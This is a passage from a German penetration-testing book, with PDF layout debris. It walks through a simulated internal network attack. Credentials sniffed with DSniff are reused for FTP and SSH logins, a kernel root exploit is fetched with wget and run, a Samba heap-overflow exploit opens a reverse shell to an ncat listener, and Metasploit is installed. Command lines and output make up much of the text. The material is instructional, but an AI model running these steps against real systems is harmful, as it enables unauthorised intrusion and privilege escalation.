den\n450\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nVerantwortlichen durch einen Selbsttest mit OpenVAS (der eigentliche Zweck dieser Security-Suiten) schon l\u00e4ngst h\u00e4tten aufgefallen sein m\u00fcssen. Allerdings ist f\u00fcr stille Eskapaden vom Einsatz einer Vulnerability-Suite wie OpenVAS selbstredend abzuraten, da dieses Vorgehen schlichtweg zu auff\u00e4llig ist. Im Regelfall verwendet OpenVAS \u00fcber 13.000 Plugins, da sind kilometerweise rote Eintr\u00e4ge in den Logfiles der zu penetrierenden Rechner programmiert. Es gibt allerdings auch Ausnahmen: So erleben wir zahlreiche F\u00e4lle, bei denen im Rahmen von verdeckt durchzuf\u00fchrenden Vulnerability Assessments die neuralgischen Bereiche ganzer Rechenzentren durchk\u00e4mmt werden, diese recht aggressive Herangehensweise seitens der Verantwortlichen jedoch offenbar nicht wahrgenommen wird. Zumindest fallen diese regelm\u00e4\u00dfig aus allen Wolken, wenn ihnen der Vorstand kurze Zeit sp\u00e4ter den Auditbericht nebst Empfehlungen zur Steigerung des Sicherheitsniveaus auf den Tisch knallt. Die Autoren m\u00f6chten an dieser Stelle nicht verschweigen, dass viel Vorbereitung und Feinabstimmung notwendig sind, um OpenVAS nutzbringend einzusetzen. Wer die L\u00f6sung jedoch abgestimmt und erfolgreich in das Security Management integriert hat, kann sich sicher sein, den Gro\u00dfteil aller bedeutenden Schwachstellen automatisiert abzuklopfen. Ein marodes System l\u00e4sst sich \u00fcber diesen Weg sehr wirkungsvoll enttarnen, welches andernfalls einem Hacker als \u00bbHomebase\u00ab f\u00fcr weitere Ma\u00dfnahmen dienen k\u00f6nnte. So lieferte uns das Szenario unter anderem konkrete Hinweise zu einer Schw\u00e4che im Samba-Server, die uns ohne Hintergrundwissen bei Einsatz des Scanners Nmap nie aufgefallen w\u00e4re. Wir halten somit fest, dass OpenVAS die gezielte Suche nach irgendeiner beliebigen Schw\u00e4che ungemein erleichtert, da sich andererseits das manuelle Scanning nebst Zuordnung sehr aufwendig gestaltet und fundiertes Fachwissen voraussetzt. Hierf\u00fcr liefert das \u00bbSchlachtschiff\u00ab OpenVAS mit seiner Herangehensweise, die mit \u00bbvolle Breitseite\u00ab beschrieben werden kann, ein sehr machtvolles Instrument. Alle anderen Entdeckungsreisenden, die m\u00f6glichst wenig Aufsehen erregen wollen und ein bestimmtes Ziel im Fokus haben, sollten sich lieber der klassischen Handarbeit widmen.\n18.5\nDer Tritt vors Schienbein: Exploits\nWir sind beim Scanning \u00fcber zahlreiche Sicherheitsl\u00fccken gestolpert. In diesem Kapitel werden wir anhand konkreter Beispiele er\u00f6rtern, wie sich die von uns entdeckten Schw\u00e4chen durch Schadprogramme ausnutzen lassen. Hierbei versuchen wir erneut, eine bei kriminellen Netzwerkforschern nicht un\u00fcbliche Herangehensweise zu simulieren. Wir erinnern uns: Grunds\u00e4tzliches Ziel ist es weiterhin, einen Rechner zu unterwandern und ihn als \u00bbHomebase\u00ab f\u00fcr langfristige Attacken aufzubauen. F\u00fcr eine erfolgreiche Umsetzung bedarf es der Erschleichung eines Benutzerkontos (idealerweise mit administrativen Rechten) auf dem zu kompromittierenden System.\n18.5 Der Tritt vors Schienbein: Exploits\n451\nBeim Thema Benutzerkonto erinnern wir uns an das folgende Logfile von DSniff, bei dem eine FTP-Sitzung samt Userdaten aus dem LAN mitgeschnitten wurde: ----------------02/04/10 13:25:52 tcp 192.168.1.229.1818 -> 192.168.1.211.21 (ftp) USER amueller PASS harleydavidson\nDie Untersuchung des Zielhosts mit dem Scanner Nmap l\u00e4sst keinerlei Zweifel dar\u00fcber aufkommen, dass es sich bei dem Rechner um ein mit Linux best\u00fccktes System handelt: Nmap scan report for 192.168.1.211 Host is up (0.00075s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.1 22/tcp open ssh OpenSSH 5.1p1 Debian 5 (protocol 2.0) | ssh-hostkey: 1024 d1:0e:f0:1f:4b:24:94:9d:c1:b7:82:1a:6e:39:8c:1d (DSA) |_2048 b7:ea:f0:a6:d7:83:61:75:5b:55:f3:b2:f8:59:17:48 (RSA)\nZudem erhielten wir durch Nmap einen interessanten Hinweis darauf, dass dieses Linux-System m\u00f6glicherweise einen anf\u00e4lligen Kernel 2.6.13 beherbergt, durch den wir uns administrative Rechte ergaunern k\u00f6nnen: MAC Address: 00:0C:29:16:7E:74 (VMware) Device type: general purpose Running: Linux 2.6.X OS details: Linux 2.6.13 \u2013 2.6.28 Network Distance: 1 hop Service Info: OSs: Unix, Linux\n18.5.1 wunderbar_emporium Interessant ist der Hinweis f\u00fcr uns deshalb, da s\u00e4mtliche Kernel-Versionen 2.4 und 2.6 seit dem Jahre 2001 auf allen Architekturen anf\u00e4llig sind f\u00fcr eine kritische Sicherheitsl\u00fccke \u2013 zumindest dann, wenn nachtr\u00e4glich kein aktueller Kernel eingespielt wurde. Die L\u00fccke erm\u00f6glicht es Anwendern mit eingeschr\u00e4nkten Rechten, an Root-Rechte auf dem System zu gelangen. Ursache ist eine Null-Pointer-Dereferenzierung im Zusammenhang mit der Initialisierung von Sockets f\u00fcr selten verwendete Protokolle. Der Fehler l\u00e4sst sich allerdings nicht ohne direkten Zugang \u2013 also remote von einem beliebigen anderen System \u2013 ausnutzen. Der Angreifer muss also bereits einen ShellZugang auf dem attackierten Computer haben, was aufgrund der mitgeschnittenen FTPLogin-Daten m\u00f6glicherweise f\u00fcr uns jedoch bald Realit\u00e4t sein d\u00fcrfte. Wir schlussfolgern dank unserer Erfahrung, dass es sich beim Login-Namen amueller und dem Kennwort\n452\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nharleydavidson um einen FTP-Benutzeraccount handelt, und versuchen unser Gl\u00fcck zun\u00e4chst per FTP: root@discordia:~# ftp 192.168.1.211 Connected to 192.168.1.211. 220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.1.211] Name (192.168.1.211:root): amueller 331 Password required for amueller Password: 230 User amueller logged in Remote system type is UNIX. Using binary mode to transfer files. ftp> quit 221 Goodbye. root@discordia:~#\nBingo! Das Login mit dem ergaunerten Nutzerkonto verlief erfolgreich. Bevor Sie dieses Experiment wiederholen: Sie m\u00fcssen sich sp\u00e4testens an dieser Stelle bewusst sein, dass jetzt die Zeit der Unschuld endg\u00fcltig vorbei ist und wir mit mehr als nur einem Bein im Gef\u00e4ngnis stehen. Eine Strafbarkeit liegt nat\u00fcrlich nicht vor, wenn der bislang durchexerzierte Parcours Bestandteil eines Penetrationstests sein sollte, mit dem uns der Betreiber des Netzwerks offiziell und in schriftlicher Form beauftragt hat. Da der Linux-Rechner sowohl einen FTP- als auch einen SSH-Dienst anbietet \u2013 und FTP-Zug\u00e4nge oftmals an einen Useraccount gekoppelt sind, der sich auch per SSH aufrufen l\u00e4sst \u2013, versuchen wir unser Gl\u00fcck abermals, diesmal jedoch per SSH. root@discordia:~# ssh -l amueller 192.168.1.211 The authenticity of host '192.168.1.211 (192.168.1.211)' can't be established. RSA key fingerprint is b7:ea:f0:a6:d7:83:61:75:5b:55:f3:b2:f8:59:17:49. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.1.211' (RSA) to the list of known hosts.\n[[email protected]](/cdn-cgi/l/email-protection)\n's password: Linux ftpserver 2.6.26-1-686 #1 SMP Fri Mar 13 18:08:45 UTC 2009 i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Feb 1 15:13:52 2010 from pc1823.discordiawerke.de amueller@ftpserver:~$\n18.5 Der Tritt vors Schienbein: Exploits\n453\nYucks! Das FTP-Konto, welches wir eingangs durch DSniff eingefahren haben, l\u00e4sst sich auch f\u00fcr einen SSH-Zugang nutzen \u2013 f\u00fcr Eindringlinge bereits die halbe Miete. Obwohl wir bislang ausschlie\u00dflich Benutzerrechte haben, besteht in nicht seltenen F\u00e4llen eine Wahrscheinlichkeit, die Rechte durch einen Local-Exploit auszubauen. Kleiner Exkurs: Exploits sind (meist kleine) Programme, die gezielt Schw\u00e4chen oder Fehlfunktionen bei Betriebssystemen oder Anwendungen ausnutzen. Oftmals werden Exploits zur Demonstration einer Sicherheitsl\u00fccke geschrieben und im Quellcode auf popul\u00e4ren Mailinglisten wie Bugtraq212 oder Full-Disclosure213 ver\u00f6ffentlicht. Die Schw\u00e4che des Kernels, die sich der Exploit wunderbar_emporium von Brad Spengler214 zunutze macht, beruht darauf, dass einige Zeiger des Kernels bei implementierten Protokollen wie PF_BLUETOOTH, PF_IUCV, PF_INET6, PF_PPPOX und PF_ISDN uninitialisiert bleiben, was sich im Zusammenhang mit der Funktion sock_sendpage zum Ausf\u00fchren von Code mit Root-Rechten ausnutzen l\u00e4sst. Details zum Sicherheitsloch in den Kernel-Versionen 2.4 und 2.6 des Betriebssystems Linux finden sich beispielsweise auf der Webseite SecurityFocus215. Wir verschaffen uns mit den Befehlen id und w einen kurzen \u00dcberblick, um sicherzustellen, dass wir es mit einem normalen User-Account zu tun haben und dass wir auch wirklich ungest\u00f6rt, also alleine auf dem System sind: amueller@ftpserver:~$ id uid=1001(amueller) gid=1001(amueller) Gruppen=1001(amueller) amueller@ftpserver:~$ w 21:53:21 up 2:35, 1 user, load average: 0,00, 0,00, 0,00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT amueller pts/0 192.168.1.223 21:16 0.00s 0.24s 0.00s w\nEin uname -a liefert uns abermals einen Hinweis darauf, dass wir es mit einem m\u00f6glicherweise veralteten Kernel in der Version 2.6.26 zu tun haben, der aus Sicherheitsgr\u00fcnden schon l\u00e4ngst nicht mehr im Einsatz h\u00e4tte sein d\u00fcrfen. Welch gl\u00fcckliche F\u00fcgung des Schicksals \u2013 zumindest f\u00fcr unser Vorhaben. amueller@ftpserver:~$ uname \u2013a Linux ftpserver 2.6.26-1-686 #1 SMP Fri Mar 13 18:08:45 UTC 2009 i686 GNU/Linux amueller@ftpserver:~$\nJetzt gilt es, schnell zu sein. Wir halten fest, dass der Kernel anf\u00e4llig sein d\u00fcrfte f\u00fcr eine Schw\u00e4che, die sich ausnutzen l\u00e4sst. Zun\u00e4chst m\u00fcssen wir die Frage kl\u00e4ren, wie unser Schadcode auf den Rechner gelangt. Als M\u00f6glichkeit kommen beispielsweise ein Trans-\n212\nhttp://www.securityfocus.com/archive/1\n213\nhttps://lists.grok.org.uk/mailman/listinfo/full-disclosure\n214\nhttp://grsecurity.net/~spender\n215\nhttp://www.securityfocus.com/bid/36038/info\n454\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nfer des vollendeten Exploits (etwa per FTP, TFTP, Wget, HTTP, Netcat) oder die Kompilation des Exploit-Quellcodes auf dem System in Betracht \u2013 wenn die daf\u00fcr notwendigen Voraussetzungen erf\u00fcllt sind. Wir pr\u00fcfen die Verf\u00fcgbarkeit der daf\u00fcr infrage kommenden Kommandos: amueller@ftpserver:~$ which cc gcc make vi wget ftp tftp nc /usr/bin/cc /usr/bin/gcc /usr/bin/make /usr/bin/vi /usr/bin/wget /usr/bin/ftp /bin/nc amueller@ftpserver:~$\nDer Jackpot! Wir haben freie Wahl. Neben allen erdenklichen Befehlen zum Datentransfer finden wir auch einen Compiler auf dem Rechner. Aus Sicherheitsgr\u00fcnden eine Unsitte, die sich jetzt r\u00e4cht. Wir entscheiden uns daf\u00fcr, den Quellcode direkt auf dem System zu kompilieren, das es im Anschluss zu kompromittieren gilt. Dreister geht es kaum. Im Vorfeld sondieren wir aber noch mit df -h, ls -al, ps -aux und netstat -a das Umfeld. amueller@ftpserver:~$ df -h Dateisystem Gr\u00f6\u00dfe Benut Verf Ben% Eingeh\u00e4ngt auf /dev/sda1 7,5G 660M 6,5G 10% / tmpfs 126M 0 126M 0% /lib/init/rw udev 10M 80K 10M 1% /dev tmpfs 126M 0 126M 0% /dev/shm amueller@ftpserver:~$ ls -al insgesamt 68 drwxr-xr-x 2 amueller amueller 4096 15. Feb 22:30 . drwxr-xr-x 10 root root 4096 15. Feb 22:27 .. -rw------- 1 amueller amueller 436 15. Feb 22:09 .bash_history -rw-r--r-- 1 amueller amueller 220 12. Mai 2008 .bash_logout -rw-r--r-- 1 amueller amueller 3116 12. Mai 2008 .bashrc -rw-r--r-- 1 amueller amueller 675 12. Mai 2008 .profile -rw-r--r-- 1 amueller amueller 2473 9. Feb 04:00 transport_A.ppl -rw-r--r-- 1 amueller amueller 4121 10. Feb 04:00 transport_B.ppl -rw-r--r-- 1 amueller amueller 4945 11. Feb 04:00 transport_C.ppl -rw-r--r-- 1 amueller amueller 1649 12. Feb 04:00 transport_D.ppl -rw-r--r-- 1 amueller amueller 4121 13. Feb 04:00 transport_E.ppl -rw-r--r-- 1 amueller amueller 4122 7. Feb 04:00 transport_F.ppl -rw-r--r-- 1 amueller amueller 3297 8. Feb 04:00 transport_G.ppl amueller@ftpserver:~$ ps -aux Warning: bad ps syntax, perhaps a bogus '-'? See\n18.5 Der Tritt vors Schienbein: Exploits\n455\nhttp://procps.sf.net/faq.html USER PID %CPU %MEM root 1 0.0 0.2 root 2 0.0 0.0 root 3 0.0 0.0 [migration/0] root 4 0.0 0.0 [ksoftirqd/0] root 5 0.0 0.0 [watchdog/0] root 6 0.0 0.0 root 7 0.0 0.0 root 39 0.0 0.0 [kblockd/0] root 41 0.0 0.0 root 42 0.0 0.0 [kacpi_notify] root 172 0.0 0.0 root 209 0.0 0.0 root 210 0.0 0.0 root 211 0.0 0.0 proftpd 2501 0.0 0.5 (accepting connections) (...)\nVSZ 2100 0 0\nRSS 684 0 0\nTTY ? ? ?\nSTAT Ss S< S<\nSTART 19:17 19:17 19:17\nTIME COMMAND 0:02 init [2] 0:00 [kthreadd] 0:00\n0\n0 ?\nS<\n19:17\n0:00\n0\n0 ?\nS<\n19:17\n0:00\n0 0 0\n0 ? 0 ? 0 ?\nS< S< S<\n19:17 19:17 19:17\n0:00 [events/0] 0:00 [khelper] 0:00\n0 0\n0 ? 0 ?\nS< S<\n19:17 19:17\n0:00 [kacpid] 0:00\nS< S S S< Ss\n19:17 19:17 19:17 19:17 19:18\n0:00 0:00 0:00 0:00 0:00\n0 0 0 0 5488\n0 0 0 0 1380\n? ? ? ? ?\namueller@ftpserver:~$ netstat -a Aktive Internetverbindungen (Server und stehende Verbindungen) Proto Recv-Q Send-Q Local Address Foreign Address tcp 0 0 *:sunrpc *:* tcp 0 0 *:53875 *:* tcp 0 0 *:ssh *:* tcp 0 0 localhost:smtp *:* (...)\n[kseriod] [pdflush] [pdflush] [kswapd0] proftpd:\nState LISTEN LISTEN LISTEN LISTEN\namueller@ftpserver:~$\nDen Transfer des Quellcodes f\u00fchren wir mittels Wget durch und laden uns den Tarball von einem Webserver.\n456\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\namueller@ftpserver:~$ wget http://www.w00t.da.ru/wunderbar_emporium.tgz --2010-02-15 21:59:26-- http://www.w00t.da.ru/wunderbar_emporium.tgz Aufl\u00f6sen des Hostnamen \"www.w00t.da.ru\".... 213.172.16.20 Verbindungsaufbau zu www.w00t.da.ru|213.172.16.20|:80... verbunden. HTTP Anforderung gesendet, warte auf Antwort... 200 OK L\u00e4nge: 3491991 (3,3M) [text/plain] In \"wunderbar_emporium.tgz\" speichern. 100%[====================================================================== =========================================================================== ================>] 3.491.991 638K/s in 6,7s 2010-02-15 21:59:33 (513 KB/s) \u2013 \"wunderbar_emporium.tgz\" gespeichert [3491991/3491991] amueller@ftpserver:~$\nEin kurzer Blick mit ls -l belegt, dass die Datei erfolgreich \u00fcbertragen wurde: amueller@ftpserver:~$ ls \u2013l insgesamt 3416 -rw-r--r-- 1 amueller amueller 3491991 15. Feb 21:59 wunderbar_emporium.tgz amueller@ftpserver:~$\nDas Entpacken des Tarballs ist simpel: amueller@ftpserver:~$ tar xvfz wunderbar_emporium.tgz wunderbar_emporium/ wunderbar_emporium/pwnkernel.c wunderbar_emporium/tzameti.avi wunderbar_emporium/wunderbar_emporium.sh wunderbar_emporium/exploit.c amueller@ftpserver:~$\nDer Exploit l\u00e4sst sich \u00fcber ein Shell-Script starten, welches den Quellcode sowohl kompiliert als auch anschlie\u00dfend den eigentlichen Exploit-Code aufruft: amueller@ftpserver:~$ cd wunderbar_emporium/ amueller@ftpserver:~/wunderbar_emporium$ ./wunderbar_emporium.sh [+] MAPPED ZERO PAGE! [+] Resolved sel_read_enforce to 0xc01c1c57 [+] got ring0! [+] detected 2.6 style 8k stacks sh: mplayer: command not found [+] Disabled security of : SELinux [+] Got root! sh-3.2#\n18.5 Der Tritt vors Schienbein: Exploits\n457\nGot root! Wir haben soeben Root-Rechte erlangt und somit administrative Befugnisse, wie die Shell und das Doppelkreuz unverkennbar belegen (sh-3.2#). Um restliche Zweifel zu zerstreuen, reicht die Eingabe des Kommandos id: sh-3.2# id uid=0(root) gid=0(root) Gruppen=1001(amueller) sh-3.2#\nBevor wir damit beginnen, verr\u00e4terische Spuren zu verwischen und den soeben eroberten Rechner f\u00fcr langfristige Aktivit\u00e4ten auszubauen, frieren wir aus Gr\u00fcnden der besseren Lesbarkeit den aktuellen Stand kurz ein und okkupieren noch weitere Maschinen.\n18.5.2 2009-lsa.zip / Samba < 3.0.20 heap overflow Nachdem uns Nmap und OpenVAS netterweise darauf hingewiesen haben, dass der Rechner mit der IP-Adresse 192.168.1.220 einen verwundbaren Samba-Server beherbergt, z\u00f6gern wir nicht lange und widmen uns einem Root-Remote-Exploit. Dazu \u00fcbertragen wir den Quellcode von milw0rm.com216, unzippen die Datei, kompilieren den Inhalt durch cc -o frontend frontend.c functions.c lsa.c und \u00fcberzeugen uns anschlie\u00dfend mit einem ls \u2013l vom Output. root@discordia:~# wget http://milw0rm.com/sploits/2009-lsa.zip --2010-02-16 22:21:46-- http://milw0rm.com/sploits/2009-lsa.zip Resolving milw0rm.com... 66.227.17.18 Connecting to milw0rm.com|66.227.17.18|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 8112 (7.9K) [application/zip] Saving to: '2009-lsa.zip' 100%[====================================================================== =========================================================================== ================>] 8,112 --.-K/s in 0.1s 2010-02-16 22:21:46 (65.1 KB/s) \u2013 '2009-lsa.zip' saved [8112/8112] root@discordia:~# unzip 2009-lsa.zip Archive: 2009-lsa.zip inflating: build inflating: frontend.c inflating: functions.c inflating: in_frontend.h inflating: lsa.c\n216\nhttp://milw0rm.com\n458\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:~# ls -l total 56 -rw-r--r--rwxr-xr-x -rw-r--r--rw-r--r--rw-r--r--rw-r--r--\n1 1 1 1 1 1\nroot root root root root root\nroot 8112 Jan 8 root 54 Jun 23 root 769 Jan 8 root 15604 Oct 4 root 1811 Oct 11 root 16690 Jan 8\n2009 2007 2009 2007 2007 2009\n2009-lsa.zip build frontend.c functions.c in_frontend.h lsa.c\nroot@discordia:~# cc -o frontend frontend.c functions.c lsa.c functions.c: In function 'hextoint': functions.c:531: warning: incompatible implicit declaration of built-in function 'free' root@discordia:~# ls -l total 92 -rw-r--r-- 1 root root 8112 Jan 8 2009 2009-lsa.zip -rwxr-xr-x 1 root root 54 Jun 23 2007 build -rwxr-xr-x 1 root root 34626 Feb 16 22:23 frontend -rw-r--r-- 1 root root 769 Jan 8 2009 frontend.c -rw-r--r-- 1 root root 15604 Oct 4 2007 functions.c -rw-r--r-- 1 root root 1811 Oct 11 2007 in_frontend.h -rw-r--r-- 1 root root 16690 Jan 8 2009 lsa.c root@discordia:~#\nAlternativ dazu l\u00e4sst sich der Quellcode auch durch ein dem ZIP-File beiliegendes Skript kompilieren: root@discordia:~# ./build functions.c: In function 'hextoint': functions.c:531: warning: incompatible implicit declaration of built-in function 'free' root@discordia:~#\nDie Parameter des Exploits sind \u00fcbersichtlich: root@discordia:~# ./frontend Samba < 3.0.20 Zuc by Zuc (\n[[email protected]](/cdn-cgi/l/email-protection)\n) Usage: Sample: LSA www.victim.com 80.81.82.83 31337 1 root@discordia:~#\n18.5 Der Tritt vors Schienbein: Exploits\n459\nUnbedingt erw\u00e4hnenswert ist hierbei, dass wir dem Exploit sowohl eine Connectback-IP als auch einen Connectback-Port mit auf den Weg geben m\u00fcssen, mit dem sich der zu kompromittierende Samba-Dienst anschlie\u00dfend bei uns zur\u00fcckmeldet und dar\u00fcber \u2013 quasi als Lieferservice der besonderen Art \u2013 eine Reverse-Remote-Shell aufbaut. Zu diesem Zweck bringen wir unser System mit Ncat oder Netcat auf einem definierten TCP-Port \u2013 in diesem Fall der Port 31337 \u2013 in \u00bbLauerstellung\u00ab und warten auf Response. root@discordia:~# ncat -l -vv -p 31337 Ncat: Version 5.20 ( http://nmap.org/ncat ) Ncat: Listening on 0.0.0.0:31337\nDer Aufruf des Exploits gestaltet sich wie folgt, wobei es sich bei 192.168.1.220 um die IP-Adresse des zu kompromittierenden Samba-Servers handelt, 192.168.1.223 unser eigenes System darstellt, 31337 f\u00fcr den Connectback-Port steht und 4 den Wert zum Ausl\u00f6sen des Heap Overflow definiert. root@discordia:~# ./frontend 192.168.1.220 192.168.1.223 31337 4 Samba < 3.0.20 Zuc by Zuc (\n[[email protected]](/cdn-cgi/l/email-protection)\n) OS: Debian 3.1 r0a X 1st count: 1 root@discordia:~#\nDer dem Quellcode beiliegenden Datei lsa.c lassen sich die passenden Samba-Gegenstellen entnehmen, an denen der Exploit seine Fracht entfalten kann. Ist uns der genaue Release-Stand des fremden Systems nicht bekannt, helfen nur Hoffen und Ausprobieren. Hier die \u00dcbersicht: 1 \u2013 \"Debian 3.1 r0 X restart\",0x0827c000,0x0837f000,30*1024 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16\n\u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013\n\"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian \"Debian\n3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1 3.1\nr0 X\",0x0827c000,0x0837f000,30*1024 r0 noX restart\",0x0827c000,0x0837f000,30*1024 r0 noX\",0x0827c000,0x0837f000,30*1024 r0a X 1st\",0x0827c000,0x0837f000,30*1024 r0a noX restart\",0x0827c000,0x0837f000,30*1024 r0a noX\",0x0827c000,0x0837f000,30*1024 r1 noX restart\",0x0827c000,0x0837f000,30*1024 r1 noX\",0x0827c000,0x0837f000,30*1024 r2 noX restart\",0x0827c000,0x0837f000,30*1024 r2 noX\",0x0827c000,0x0837f000,30*1024 r3 noX restart\",0x0827c000,0x0837f000,30*1024 r3 noX\",0x0827c000,0x0837f000,30*1024 r4 noX restart\",0x0827c000,0x0837f000,30*1024 r4 noX\",0x0827c000,0x0837f000,30*1024 r5 noX restart\",0x0827c000,0x0837f000,30*1024\n460\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n17 \u2013 \"Debian 3.1 r5 noX\",0x0827c000,0x0837f000,30*1024 18 19 20 21 22 23 24\n\u2013 \u2013 \u2013 \u2013 \u2013 \u2013 \u2013\n\"Debian 3.1 r6a noX restart\",0x0827c000,0x0837f000,30*1024 \"Debian 3.1 r6a noX\",0x0827c000,0x0837f000,30*1024 \"Slackware 10.0 restart\",0x0827c000,0x0837f000,30*1024 \"Slackware 10.0\",0x0827c000,0x0837f000,30*1024 \"Mandrake 10.1 noX\",0x80380000,0x8045b000,30*1024 \"Mandrake 10.1 X Kde\",0x80380000,0x8045b000,30*1024 \"Samba 3.0.x DEBUG\",0x80380000,0x8045b000,30*1024\nSind wir erfolgreich mit unserem Samba-Exploit, erhalten wir durch Ncat mit der Meldung Connection from 192.168.1.220 die Gewissheit dar\u00fcber, abermals ein System \u00fcbernommen zu haben: root@discordia:~# ncat -l -vv -p 31337 Ncat: Version 5.20 ( http://nmap.org/ncat ) Ncat: Listening on 0.0.0.0:31337 Ncat: Connection from 192.168.1.220.\nUnsere Kommandos lassen sich daraufhin in der Ncat-Session absetzen und werden anschlie\u00dfend auf dem entfernten System ausgef\u00fchrt: id uid=0(root) gid=0(root) egid=65534(nogroup) groups=65534(nogroup) w 22:29:34 up 6 min, 1 user, load average: 0.05, 0.07, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root tty1 \u2013 03Jan10 13days 0.04s 0.00s /usr/sbin/vlock ls -al total 8 drwxrwxrwt 2 root root 4096 Feb 15 22:28 . drwxr-xr-x 21 root root 4096 Feb 7 19:54 ..\nStrike! Wir haben ein weiteres Mal Root-Rechte auf einem Rechner! Der Exploit macht sich hierbei einen Fehler in den Routinen zur Verarbeitung von in MS-RPC-Aufrufen \u00fcbertragenen Daten im Network Data Representation (NDR) Format zunutze. Die Schw\u00e4che kann dazu ausgenutzt werden, um einen Heap-\u00dcberlauf zu provozieren und in Folge beliebigen Programmcode mit administrativen Privilegien auf dem beherbergenden Rechnersystem auszuf\u00fchren. Weiterf\u00fchrende Informationen zur Softwareschw\u00e4che finden sich beispielsweise in der Common Vulnerabilities and Exposures List (CVE)217 oder auf SecurityFocus218.\n217\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2446\n218\nhttp://www.securityfocus.com/bid/23973\n18.5 Der Tritt vors Schienbein: Exploits\n461\nBevor wir fortfahren, frieren wir abermals den aktuellen Stand kurz ein und besetzen weitere Rechner.\n18.5.3 Metasploit Framework Das kostenlose Metasploit Framework (MSF)219 von HD Moore ist eine Sammlung m\u00e4chtiger Exploitcodes, die \u2013 best\u00fcckt mit Angriffsmechanismen und Shellcodes \u2013 beim Entdecken und Ausnutzen von Sicherheitsl\u00fccken behilflich sind. Das Framework, welches als vielf\u00e4ltiger Werkzeugkasten f\u00fcr Sicherheitsexperten bezeichnet werden kann und sich allm\u00e4hlich zu einem Standard-Tool entwickelt, bietet zum jetzigen Zeitpunkt 517 Exploits und 136 Payloads. Im Metasploit-Bauchladen ist alles enthalten, was die letzten Jahre in der Fachpresse f\u00fcr Aufsehen und unter Netzwerkverantwortlichen f\u00fcr Angstschwei\u00df gesorgt hat. Es werden gleicherma\u00dfen Exploits f\u00fcr Clients (NETAPI, RPC/DCOM, LSASS, diverse Applikationen) als auch ServerDienste (IIS, Samba, Apache, Joomla, MySQL oder FTP-Server feilgeboten, teilweise \u2013 wie bei den letzten massiven Schw\u00e4chen220 des Internet Explorers \u2013 noch vor Ver\u00f6ffentlichung eines Patches221. Im folgenden Beispiel konzentrieren wir uns auf einen Snapshot des Frameworks f\u00fcr Linux. Die Installation verl\u00e4uft unkompliziert. Das Prozedere beschr\u00e4nkt sich auf den Download der jeweils aktuellen Version222 von der Entwicklerwebsite, dem Auspacken durch eine Kombination von BZip2 und Tar nebst Customizing: root@discordia:~# wget http://www.metasploit.com/releases/framework3.3.3.tar.bz2 --2010-02-16 22:48:47-- http://www.metasploit.com/releases/framework3.3.3.tar.bz2 Resolving www.metasploit.com... 216.75.1.230 Connecting to www.metasploit.com|216.75.1.230|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 23438382 (22M) [application/x-bzip2] Saving to: 'framework-3.3.3.tar.bz2' 100%[====================================================================== =========================================================================== ================>] 23,438,382 612K/s in 40s 2010-02-16 22:49:28 (575 KB/s) \u2013 'framework-3.3.3.tar.bz2' saved [23438382/23438382]\n219\nhttp://www.metasploit.com/framework\n220\nhttp://www.heise.de/security/meldung/Exploit-fuer-IE-Sicherheitsluecke-jetzt-oeffentlich-906143.html\n221\nhttp://www.heise.de/security/meldung/Exploit-fuer-neue-IE-Luecke-952065.html\n462\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:~# bzip2 -d framework-3.3.3.tar.bz2 root@discordia:~# tar xf framework-3.3.3.tar root@discordia:~# ls -l total 112280 -rw-r--r-- 1 root root 114851840 Dec 23 07:19 framework-3.3.3.tar drwxr-xr-x 12 root root 4096 Nov 6 10:25 msf3 root@discordia:~# mkdir -p /opt/metasploit3 root@discordia:~# cp -a msf3/ /opt/metasploit3/msf3 root@discordia:~# chown root:root -R /opt/metasploit3/msf3 root@discordia:~# ln -sf /opt/metasploit3/msf3/msf* /usr/local/bin/ root@discordia:~# cd /opt/metasploit3/msf3/ root@discordia:/opt/metasploit3/msf3# ls -l total 116 -rw-r--r-- 1 root root 3160 Nov 6 08:26 README drwxr-xr-x 15 root root 4096 Nov 6 08:26 data drwxr-xr-x 6 root root 4096 Nov 6 08:26 documentation drwxr-xr-x 12 root root 4096 Nov 6 08:26 external drwxr-xr-x 13 root root 4096 Nov 6 09:44 lib drwxr-xr-x 8 root root 4096 Nov 6 08:26 modules -rwxr-xr-x 1 root root 8572 Nov 6 08:26 msfcli -rwxr-xr-x 1 root root 2358 Nov 6 08:26 msfconsole -rwxr-xr-x 1 root root 2436 Nov 6 08:26 msfd -rwxr-xr-x 1 root root 2640 Nov 6 08:26 msfelfscan -rwxr-xr-x 1 root root 7233 Nov 6 10:25 msfencode -rwxr-xr-x 1 root root 3032 Nov 6 08:26 msfgui -rwxr-xr-x 1 root root 2260 Nov 6 08:26 msfmachscan -rwxr-xr-x 1 root root 10028 Nov 6 08:26 msfopcode -rwxr-xr-x 1 root root 3037 Nov 6 08:26 msfpayload -rwxr-xr-x 1 root root 4241 Nov 6 08:26 msfpescan -rwxr-xr-x 1 root root 1959 Nov 6 08:26 msfrpc 